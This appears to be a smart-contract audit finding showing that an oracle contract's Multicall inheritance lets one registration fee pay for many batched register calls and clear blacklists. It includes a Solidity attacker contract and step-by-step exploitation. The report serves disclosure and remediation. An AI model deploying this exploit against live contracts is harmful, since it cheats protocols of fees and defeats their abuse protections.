### Title
`msg.value` Reused Across `Multicall` Batches Allows Free Pool Registration and Blacklist Bypass — (`smart-contracts-poc/contracts/oracles/providers/OracleBase.sol`)

---

### Summary

`OracleBase` inherits OpenZeppelin's `Multicall`, which executes each batched call via `delegatecall`. Because `delegatecall` preserves `msg.value` in every sub-call, a caller can batch N invocations of the payable `register` function while supplying only one registration fee. Each iteration passes the `msg.value >= registrationFee` guard, so the protocol collects one fee but grants N registrations — and, as a side-effect, clears the blacklist for N pools.

---

### Finding Description

`OracleBase` is declared as:

```solidity
contract OracleBase is AccessControl, Multicall, IOffchainOracle {
``` [1](#0-0) 

The `register` function is `payable` and enforces a fee gate:

```solidity
function register(bytes32 feedId, address pool, address factory) external payable {
    require(msg.value >= registrationFee, InsufficientFee(msg.value, registrationFee));
    ...
    registeredPool[feedId][pool] = true;
    emit PoolRegistered(feedId, pool, msg.sender, msg.value);
}
``` [2](#0-1) 

OpenZeppelin's `Multicall.multicall` dispatches each call with `delegatecall`. Under `delegatecall`, `msg.value` is **not consumed** — it remains the same value for every sub-call in the batch. Therefore, a caller who sends `registrationFee` wei and batches N `register` calls will pass the fee check N times while the contract's balance increases by only `registrationFee` once.

The `register` function also unconditionally clears the blacklist for the pool being registered:

```solidity
if (blacklisted[pool]) {
    blacklisted[pool] = false;
    emit BlacklistUpdated(pool, false);
}
``` [3](#0-2) 

This means a single-fee multicall can also clear the blacklist for N pools simultaneously.

Both concrete oracle implementations — `ChainlinkOracle` and the Pyth variant — inherit `OracleBase` and therefore inherit `Multicall`, so all deployed oracle instances are affected. [4](#0-3) 

---

### Impact Explanation

**Direct loss of protocol fee revenue.** The `registrationFee` is the protocol's mechanism for monetising on-chain price-read access. The admin comment confirms overpayment is intentionally kept:

> "Overpayment is NOT refunded: any msg.value above registrationFee is kept and is withdrawable by ADMIN via withdrawEth. This is intentional." [5](#0-4) 

An attacker pays one fee and registers an unbounded number of `(feedId, pool)` pairs, depriving the protocol of all but one fee unit. At any non-trivial `registrationFee` (e.g., 0.1 ETH set by ADMIN), the loss scales linearly with the number of registrations.

**Secondary: blacklist bypass.** The abuse-protection blacklist — which is the primary guard preventing malicious pools from reading oracle prices — can be cleared for N pools with a single payment, undermining the entire abuse-protection layer. [6](#0-5) 

---

### Likelihood Explanation

**High.** The trigger is fully unprivileged — any EOA or contract can call `multicall`. No special role, no malicious setup, and no non-standard token is required. The `Multicall` interface is public and well-known. The default `registrationFee` of `1 wei` means the attack is essentially free at deployment, and even after the admin raises the fee the attack remains profitable for any batch of size ≥ 2. [7](#0-6) 

---

### Recommendation

Remove `Multicall` from `OracleBase`, or make `register` non-payable and use a pull-payment / pre-approved ERC-20 fee model instead of `msg.value`. If `Multicall` must be retained for other functions, add a reentrancy-style guard that tracks how much ETH has already been consumed within the current top-level call and deducts it from subsequent sub-calls, or simply revert if `msg.value > 0` inside any `delegatecall` context.

---

### Proof of Concept

```solidity
// Attacker contract
contract AttackMulticallRegister {
    OracleBase oracle;
    address factory;

    constructor(address _oracle, address _factory) {
        oracle = OracleBase(_oracle);
        factory = _factory;
    }

    function attack(
        bytes32[] calldata feedIds,
        address[] calldata pools
    ) external payable {
        // Build N register() calls
        bytes[] memory calls = new bytes[](feedIds.length);
        for (uint256 i = 0; i < feedIds.length; i++) {
            calls[i] = abi.encodeCall(
                OracleBase.register,
                (feedIds[i], pools[i], factory)
            );
        }
        // Send only ONE registrationFee; every sub-call sees the same msg.value
        oracle.multicall{value: msg.value}(calls);
        // Result: N pools registered, protocol received only 1 fee
    }
}
```

1. Admin sets `registrationFee = 1 ether`.
2. Attacker calls `attack{value: 1 ether}(feedIds[0..99], pools[0..99])`.
3. Each of the 100 `register` delegatecalls sees `msg.value == 1 ether` and passes `require(msg.value >= registrationFee)`.
4. All 100 `(feedId, pool)` pairs are written to `registeredPool`, and any blacklisted pools are cleared.
5. The oracle contract's balance increases by only `1 ether` instead of `100 ether`. [2](#0-1)
